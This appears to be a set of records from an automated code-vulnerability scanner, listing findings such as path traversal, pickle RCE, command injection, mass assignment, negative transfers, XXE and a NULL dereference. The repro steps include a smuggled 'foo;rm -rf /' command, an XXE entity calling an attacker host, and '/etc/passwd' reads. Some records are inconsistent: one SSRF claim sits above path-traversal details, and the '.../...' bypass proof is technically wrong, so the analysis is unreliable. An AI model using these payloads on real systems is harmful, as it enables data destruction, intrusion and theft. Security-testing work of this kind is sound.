parsed_findings.vuln_claim: Unvalidated user-supplied URL is proxied directly, enabling SSRF to arbitrary hosts.

parsed_findings.chain_steps: user input -> insufficient sanitization -> path join -> fs.readFile
parsed_findings.impact: Any file under the filesystem becomes readable, breaking confidentiality.
parsed_findings.proof: `(req.query.file||'').replace('../','')` can be bypassed by repeating dots or encoding, so `path.join('/srv/data', '.../.../etc/passwd')` reads arbitrary files.
parsed_findings.repro_steps: Request `/download?file=.../.../etc/passwd` to trick the replace and read `/etc/passwd`.
parsed_findings.vuln_claim: Path normalization only strips literal '../' before joining, allowing crafted queries like '.../.../secret' to escape `/srv/data`.

results.raw_output: {"findings":[{"cwe":"CWE-22","file":"files.js","line_start":2,"line_end":3,"vuln_claim":"Path normalization only strips literal '../' before joining, allowing crafted queries like '.../.../secret' to escape `/srv/data`.","proof":"`(req.query.file||'').replace('../','')` can be bypassed by repeating dots or encoding, so `path.join('/srv/data', '.../.../etc/passwd')` reads arbitrary files.","repro_steps":"Request `/download?file=.../.../etc/passwd` to trick the replace and read `/etc/passwd`.","impact":"Any file under the filesystem becomes readable, breaking confidentiality.","confidence":0.75,"chain_steps":"user input -> insufficient sanitization -> path join -> fs.readFile"}]}

parsed_findings.impact: Remote code execution in the Python process via crafted state cookie deserialization.
parsed_findings.proof: Cookie value is decoded and passed straight into pickle.loads without validation, so a malicious payload triggers arbitrary deserialization.
parsed_findings.repro_steps: Set the state cookie to a base64-encoded pickle payload that deserializes to an object whose __reduce__ runs attacker code, then call /resume.
parsed_findings.vuln_claim: Unsafely deserializes a base64-encoded cookie using pickle, allowing attacker-crafted payloads to execute code.

results.raw_output: `{"findings":[{"cwe":"CWE-502","file":"session.py","line_start":3,"line_end":7,"vuln_claim":"Unsafely deserializes a base64-encoded cookie using pickle, allowing attacker-crafted payloads to execute code.","proof":"Cookie value is decoded and passed straight into pickle.loads without validation, so a malicious payload triggers arbitrary deserialization.","repro_steps":"Set the state cookie to a base64-encoded pickle payload that deserializes to an object whose __reduce__ runs attacker code, then call /resume.","impact":"Remote code execution in the Python process via crafted state cookie deserialization.","confidence":0.6,"chain_steps":""}]}`

parsed_findings.impact: Attacker can modify other users or grant themselves privileges.
parsed_findings.proof: Object.assign merges the entire req.body into the fetched user record before saving, so attackers can flip fields at will.
parsed_findings.repro_steps: Send PATCH /api/users/<victim-id> with payload {"isAdmin":true} as a normal user and observe elevated attributes.
parsed_findings.vuln_claim: No ownership check before patch lets any authenticated caller update any user record.

parsed_findings.impact: Arbitrary command execution as the app user.
parsed_findings.proof: Line 7 constructs tar cmd with raw name and src from request.
parsed_findings.repro_steps: Send POST /backup with name="foo;rm -rf /" src="/var/data/app" and observe command execution.
parsed_findings.vuln_claim: Unsanitized name in shell command allows cmd injection.

parsed_findings.chain_steps: transfer(): parse request amount; negative value turns subtraction into an addition and addition into subtraction, reversing intent.
parsed_findings.impact: Attacker can create money and steal from any account by submitting negative transfers.
parsed_findings.proof: `amt` is parsed once and applied without checking sign, letting a negative value invert the debit/credit operations.
parsed_findings.repro_steps: POST /transfer with amount=-100 and to=target_id to bump the caller’s balance and reduce the victim’s.
parsed_findings.vuln_claim: Negative amounts pass validation, so attackers credit themselves while debiting others.

parsed_findings.chain_steps: Request XML → parser resolves SYSTEM entity → attacker-controlled resource fetched
parsed_findings.impact: Sensitive file disclosure or SSRF via XML entity resolution.
parsed_findings.proof: parser created with resolve_entities=True and no_network=False before parsing request payload.
parsed_findings.repro_steps: Send crafted XML with <!DOCTYPE ...><!ENTITY xxe SYSTEM "http://attacker/secret"><root>&xxe;</root> and observe request to attacker host.
parsed_findings.vuln_claim: XML parser resolves external entities over HTTP with no restrictions, enabling XXE.

parsed_findings.impact: Process crashes from NULL write, enabling denial of service.
parsed_findings.proof: `if (out || out_sz == 0)` skips return when `out` is NULL, then lines 5-6 dereference it.
parsed_findings.repro_steps: Call `copy_name(NULL, NULL, 16)` to hit the memcpy with a NULL destination.
parsed_findings.vuln_claim: Null pointer guard wrongly uses `out ||` so NULL `out` with positive size bypasses the check.

results.raw_output: {"findings":[{"cwe":"CWE-476","file":"safe_copy.c","line_start":3,"line_end":6,"vuln_claim":"Null pointer guard wrongly uses `out ||` so NULL `out` with positive size bypasses the check.","proof":"`if (out || out_sz == 0)` skips return when `out` is NULL, then lines 5-6 dereference it.","repro_steps":"Call `copy_name(NULL, NULL, 16)` to hit the memcpy with a NULL destination.","impact":"Process crashes from NULL write, enabling denial of service.","confidence":0.0,"chain_steps":""}]}
